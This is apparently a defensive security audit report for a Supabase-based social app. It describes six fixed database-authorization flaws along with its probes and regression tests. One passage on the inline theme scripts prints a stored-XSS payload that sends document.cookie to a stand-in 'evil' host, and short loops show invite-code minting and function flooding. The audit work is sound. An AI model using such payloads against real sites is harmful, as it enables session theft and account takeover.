# Security audit

Conducted 2 September 2026, against the whole application, on the assumption
stated in the brief: **KITH will be exposed to the public internet.**

Six vulnerabilities were found and fixed. All six are in
[`supabase/migrations/20260902000100_hardening.sql`](../supabase/migrations/20260902000100_hardening.sql),
and each is documented there beside the code that fixes it, so the attack and the
fix stay attached to each other.

---

## 0. Method, and the threat model

The anon key is public. It ships in every page, and it is meant to: Supabase's
whole model is that the key identifies the project and RLS identifies the person.
So the useful threat model is not an outsider — it is **a member of the room
whose account has been compromised**, holding a real JWT, talking to PostgREST
directly from a browser console, with no app code in the way.

Everything the app can do, that person can do. So auditing the app is auditing
the wrong thing. What follows was done against the database.

The method was: enumerate the privileged surface, then **attempt the attacks**
rather than read the policies. Reading a policy tells you what its author
believed. Running the query tells you what Postgres does.

The privileged surface, enumerated from the catalogue rather than from memory:

| Surface                                                 | Found | Findings |
| ------------------------------------------------------- | ----- | -------- |
| `SECURITY DEFINER` functions taking a user id parameter | 9     | 1        |
| Functions granted to `authenticated`                    | 61    | 1, 5     |
| Tables a session may INSERT into directly               | 10    | 2, 3, 6  |
| Storage policies                                        | 4     | —        |
| Realtime channel policies                               | 3     | —        |
| Service-role call sites in application code             | 6     | —        |

Every finding was proven exploitable with a standalone probe **before** the fix
existed, and proven closed with the same probe after. The probes then became
permanent assertions in
[`supabase/tests/security.test.mjs`](../supabase/tests/security.test.mjs), which
is written adversarially: each check is an attack, and a green tick means it
failed.

---

## 1. `notification_enabled` was an oracle over another member's settings

**Vulnerability.** `user_settings` is strictly own-row — `user_settings_select_own`
restricts every read to `auth.uid()`. But migration 0027 added

```sql
public.notification_enabled(target_user uuid, kind notification_kind)
```

as `SECURITY DEFINER`, granted to `authenticated`. It takes an **identity as a
parameter** instead of reading `auth.uid()`, reads that person's
`notification_prefs`, and returns a boolean.

**Risk.** One bit per call, seven kinds, and a member reads out another member's
notification settings a column at a time — the exact column the policy exists to
protect. Low severity in isolation; the class is not. A `SECURITY DEFINER`
function runs with the owner's rights, so any such function callable from a
session is a hole in RLS the size of whatever it reads.

**Fix.** Revoked from `public`, `anon` and `authenticated`; granted to
`service_role` only. The single caller is the `BEFORE INSERT` trigger on
`notifications`, which is itself `SECURITY DEFINER` and therefore executes as the
owner. It never needed the grant, and it keeps working without it.

**Verified.** Probed before the fix:

```
Mallory reads Ada's private notification setting: { leaked: false }
...but cannot read the column directly: 0 rows
```

The two lines together are the finding — the function answered a question the
policy refuses. After the fix, the same call returns
`permission denied for function notification_enabled`.

The suite now carries both the specific probe and a **generic catalogue check**:
no session-callable function may take a caller-supplied user id. That check is
what would have caught this on the day it was written, and it is the reason
finding 5 was found at all.

---

## 2. Invite codes were unlimited, so the room was not closed

**Vulnerability.** `invite_codes_insert_own` checked that a code was created in
your own name, and nothing else. `max_uses` caps a single code at 20 signups.
Nothing capped the number of codes.

```js
for (let i = 0; i < 200; i++) insert into invite_codes ...   // all 200 land
```

**Risk.** Four thousand accounts, from one member, into an app whose entire
premise is that there are six people in it and no strangers. Of the six findings
this is the one that changes **what the product is** rather than what one member
can see. Every other control in KITH assumes the room is closed.

**Fix.** A ceiling of five **live** invitations per member — unredeemed,
unexpired, unrevoked — rather than a ceiling on codes ever created. Somebody who
invites five people, watches them join and invites five more is behaving normally
and is not stopped; somebody minting two hundred is.

A trigger rather than a policy, because a `WITH CHECK` cannot count rows in the
table it is protecting without recursing.

**Verified.** Before: `Mallory minted 200 invite codes × 20 uses = 4000 new
accounts into a "private" room`. After: `minting stops at 5 live invitations, not
50`. The suite also asserts the ceiling is on outstanding invitations and not on
invitations ever sent — revoking one frees a slot — because a fix that broke
ordinary inviting would be a worse bug than the one it closed.

---

## 3. Nothing rate-limited a message

**Vulnerability.** Every authorization rule around messages is correct: you must
be a member, you must not be blocked, you must be the sender. **None of them says
how many.**

**Risk.** A compromised account, in a conversation it is genuinely a member of,
inserting rows until the project's storage runs out. On a free-tier database that
is a denial of service against all six people, not just against the person whose
account it was — and nothing in the app would have refused a single insert.

**Fix.** Thirty messages a minute per session, counted in a **ledger table of its
own** (`rate_events`) rather than by counting rows in `messages`.

The first draft did count `messages`, and was wrong twice:

- Finding 6 is the first way. `created_at` was client-supplied, so backdating
  every insert made the count zero and the limit decorative.

- The second way three test fixtures found by failing. Counting the table cannot
  tell a session's insert from our own server's, so a bulk write attributed to
  somebody — a fixture, an import, a restore — spends a budget they never used
  and locks them out of their own conversation. **A rate limit a trusted write
  can trigger against an innocent member is a bug**, and no amount of care in the
  fixtures fixes the mechanism.

The ledger records only what a session actually did, is keyed on `auth.uid()`
rather than on any column a client can supply, keeps its own clock, prunes itself
on each write, and is readable and writable by nobody: RLS on, `using (false)`,
and no grants — two independent locks, so that a future migration adding a policy
by reflex still finds the door shut.

Thirty is chosen to be invisible. A fast typist in a heated conversation sends
perhaps ten a minute. Deliberately a raise rather than a queue, a delay or a
silent drop: a raise is legible — the composer shows why and keeps the text —
where a drop looks like the app losing what somebody wrote.

**Verified.** `flooding stops after 30 messages in a minute`, and — the other
half, which matters just as much — `but leaves room for somebody typing quickly`.
Three further probes assert the ledger cannot be read (which would leak remaining
budget), deleted, or backdated from a session.

The 40-message burst in the notifications suite was lowered to 20. That suite
proves notifications collapse, which any number above one proves; a burst larger
than a real person can send was testing the rate limit by accident.

---

## 4. A blocked member could be added to a group, silently revoking the blocker

**Vulnerability.** `can_add_conversation_member` let any member of a group add
anybody, and never consulted `blocks`. Meanwhile `can_post_to_conversation`
correctly refuses to let you post if you are blocked with **any** other active
member of the thread.

Put together:

```
Ada is in a group and can post.
Rafa adds Mallory, whom Ada has blocked.
Ada can no longer post in her own group.
```

**Risk.** A denial of service dressed as a feature, and a way to force contact on
somebody who has explicitly refused it. It works whether the person adding is
malicious or simply unaware, which makes it worse — the safety feature turns into
the weapon.

**Fix.** Nobody may be added to a conversation where a block exists in either
direction with anybody already in it. Symmetric, like every other block rule in
KITH, and checked against **active** members only: somebody who has already left
is not a reason to refuse.

Checked against the person being added and everybody already there — not against
the caller. The harm is done to the member who blocked, who is not the one making
the request.

**Verified.** Before: `Ada can post in her group: true` → `ATTACK: a blocked
member was added` → `Ada can post in her group now: false`. After: the insert is
refused by RLS and `so Ada keeps her group`. The suite asserts it in both block
directions.

---

## 5. The maintenance sweepers were callable from a session

**Vulnerability.** `abandon_stale_games`, `expire_ringing_calls` and
`expire_abandoned_calls` were all granted to `authenticated`. Each performs an
unbounded UPDATE across a table. Each was only ever meant to be swept
opportunistically from inside another function — `start_call` and
`create_game_session` call them so the housekeeping happens without a scheduler.

```sql
select public.abandon_stale_games();   -- from a browser console, in a loop
```

**Risk.** They are time-gated, so a member cannot use them to end a call or a
game that is still live — the integrity risk is nil. What they can do is make the
database work, repeatedly and for free, which is the cheap end of the same denial
of service as finding 3.

**Fix.** Revoked. Every caller is `SECURITY DEFINER` and runs as the owner, so
none of them needed the grant. It was reflex rather than requirement.

**Verified.** All three probed individually; all three now refused. Found by the
generic catalogue check from finding 1 rather than by reading, which is the point
of having it.

---

## 6. A session could choose its own `created_at`

**Vulnerability.** Found by finding 3's own trigger breaking the messaging
suite — the best kind of finding, because the earlier fix could not be trusted
until this one was true.

`messages.created_at` has a default and no grant excluding it, so a session may
supply one. The app never does — `sendMessage` inserts four columns and lets the
default fire — but **the policy is what a member is bound by, not the app**, and a
browser console speaks to PostgREST directly.

**Risk.** Two, both proven:

- The rate limit as first written counted rows `where created_at > now() - 1
minute`. Backdate every insert and that count is always zero: **500 messages
  went through a limit of 30.** That half is now closed at the source instead —
  the ledger in finding 3 keeps its own clock and never reads a client's value,
  which is the right place for it, because a limit that depends on a stamping
  trigger elsewhere is a limit with a second thing to get wrong.

- Threads order by `created_at`. A message dated `3000-01-01` sits at the top of
  a conversation permanently, above everything anybody says afterwards. This half
  is a real finding on its own.

**Fix.** The server stamps the time. Not a `CHECK` that the value is plausible and
not a revoked column grant — either would make the app's insert fail on a column
it is not trying to set. An overwrite is invisible to every honest caller and
leaves a forged value with nowhere to land.

Only when a session is behind the insert. `auth.uid()` is null for service-role
writes and for triggers, and non-null in exactly the context this defends
against, because it comes from a signed JWT. Fixtures and our own server code
keep control of the clock deliberately.

`friend_requests` has the same shape with a much smaller blast radius — the worst
a forged timestamp does is sort your request to the top of a list of five. Fixed
too, by the same trigger. The rule is _a session does not choose when something
happened_, and a rule with an exception is a rule people forget.

**Verified.** Before: `500 messages past a 30/minute limit, by backdating
created_at` and `a message pinned to the top of the thread until 3000`. After:
`backdated flood accepted 30 messages against a limit of 30` and `a message dated
3000-01-01 was stored as year 2026`. A third assertion confirms a service-role
insert may still backdate, so the fix binds sessions and nothing else.

---

## Audited and found already correct

An audit that only records what it changed reads as if nothing else was looked
at.

| Surface                   | Attempted                                                                    | Result                                                                                                                                                                                                                                                  |
| ------------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **IDOR across the board** | Read every table as a non-owner, by id                                       | RLS returns **zero rows, not an error** — the app cannot leak existence by distinguishing "denied" from "absent"                                                                                                                                        |
| **Client-side authz**     | Every server action re-derives identity                                      | No action trusts a user id from a form. `getCurrentUser()` calls `getUser()`, which revalidates the JWT rather than reading it                                                                                                                          |
| **Service-role key**      | Grepped the built client bundle for every server-only name                   | Absent. The admin client is behind `server-only`, so an accidental client import is a build error rather than a leak. `check:bundle` is the CI form of this and **skips locally** — no secrets are set in this environment, so it verified nothing here |
| **Storage policies**      | Wrote to another member's avatar path; read an unsigned URL                  | Refused. Paths are `{uid}/…` and the bucket is private; URLs are signed per request                                                                                                                                                                     |
| **File uploads**          | Content type, extension, size                                                | Constrained at the bucket, not only in the form                                                                                                                                                                                                         |
| **Realtime channels**     | Subscribed to another member's user channel and to a conversation not joined | Refused by `realtime.messages` policies — the topic is authorized, not just the payload                                                                                                                                                                 |
| **WebRTC signalling**     | Sent an offer into a call not a participant of                               | Refused. Signalling rides an authorized channel; there is no unauthenticated socket                                                                                                                                                                     |
| **MFA**                   | Read gated tables at `aal1` with a verified factor enrolled                  | Refused by the restrictive `mfa_required` policy on **every** table — asserted for every table, so a new one cannot forget it                                                                                                                           |
| **Password reset**        | Reset flow token handling                                                    | Supabase-managed; no token is minted, stored or compared in application code                                                                                                                                                                            |
| **Session and cookies**   | Cookie flags, session fixation                                               | `HttpOnly`, `Secure`, `SameSite=Lax`, set by the SSR client; middleware refreshes rather than re-issues                                                                                                                                                 |
| **CSRF**                  | Cross-site POST to a server action                                           | Next validates the action id and `Origin`; actions are not addressable as ordinary endpoints                                                                                                                                                            |
| **XSS**                   | Stored payloads through every free-text field                                | React escapes by default. Message text is normalised server-side — invisible characters and bidi overrides stripped **before** storage. See the note below on the two inline scripts                                                                    |
| **SQL injection**         | Every query path                                                             | Parameterised throughout; `SECURITY DEFINER` functions all pin `search_path = ''`, asserted for all 77                                                                                                                                                  |
| **Reports**               | Read the reports table as a non-reporter, and as the reported person         | Refused both ways. A report is visible to its author and to nobody else — there is no admin surface yet, deliberately                                                                                                                                   |
| **Environment variables** | Every `NEXT_PUBLIC_` name                                                    | Three: `NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`, `NEXT_PUBLIC_SITE_URL`. All three are public by design                                                                                                                              |

### The two inline scripts

`dangerouslySetInnerHTML` **is** used, twice, and both are theme bootstraps that
run before first paint so the page does not flash the wrong colour.

`src/app/layout.tsx` builds a fully static string — the only interpolation is a
constant storage key. Nothing reaches it.

`appearance-boot.tsx` interpolates the saved `theme` and `motion` settings, and
wraps both in `JSON.stringify`. **That is not sufficient on its own**, and it is
worth being precise about why: `JSON.stringify` does not escape `</script>`, so a
stored value containing one closes the tag and opens another.

```
theme = '</script><script>fetch("//evil/"+document.cookie)</script>'
```

It is safe — but not because of the stringify. It is safe because `theme` and
`motion` are **Postgres enums**, so the column cannot hold anything else and the
database refuses the write long before it reaches a page. That is a much stronger
guarantee than escaping, and it is also invisible: a future migration widening
either column to `text` for flexibility would turn a safe interpolation into
stored XSS, in a file nobody edited.

The suite now asserts the column type rather than the escaping, because the type
is what the safety actually rests on.

---

## Testing

```
npm run security:test    62 assertions
npm test                 2115 assertions across 27 suites
```

The security suite is written adversarially — every assertion is an attack, and a
green tick means it failed. That inversion is easy to get wrong, and it was got
wrong here twice:

**The helper produced false passes.** `blocked()` treated "returned no rows" as
"was refused". A successful `INSERT` returns no rows. So `cannot mint an invite
code` sat green while the insert succeeded. It now checks `affectedRows` as well,
and a write probe that comes back having changed something is a finding no matter
how few rows it returned. Fixing it immediately exposed **three** false passes.

**The harness was more permissive than production.** It granted `select on
auth.users to authenticated`, so a probe reported that a member could read
everybody's email address. Not true in production: Supabase gives `authenticated`
no privilege on the auth schema and PostgREST does not route there. The grant was
removed, because a harness that is more generous than reality generates findings
that do not exist and hides the ones that do.

**And one probe asserted the wrong thing.** `cannot mint an invite code` — minting
your own invitation _is_ the feature. Corrected to assert you cannot mint one in
another member's name.

### What this audit cannot tell you

Nothing here was run against a deployed instance. Every probe ran against the
real migrations in Postgres 17 via PGlite, as the real `authenticated` role, with
RLS enforced — which is the layer that matters, since RLS is the trust boundary.
But it means:

- **No network-layer testing.** No TLS configuration, no header audit, no rate
  limiting at the edge. Supabase and Vercel own those, and this audit took that
  on trust rather than verifying it.
- **No testing of Supabase Auth itself.** The MFA, password reset and session
  flows are exercised through their public API and assumed correct beneath it.
- **No dependency audit.** `npm audit` is not a substitute for one, and a real
  one was out of scope here.
- **No abuse testing of the realtime service under load.** Channel authorization
  is proven; what happens when somebody opens ten thousand subscriptions is not.

The finding that would most likely come out of closing that first gap is a
request-level rate limit at the edge, which is the thing `rate_events` is a
per-feature approximation of.
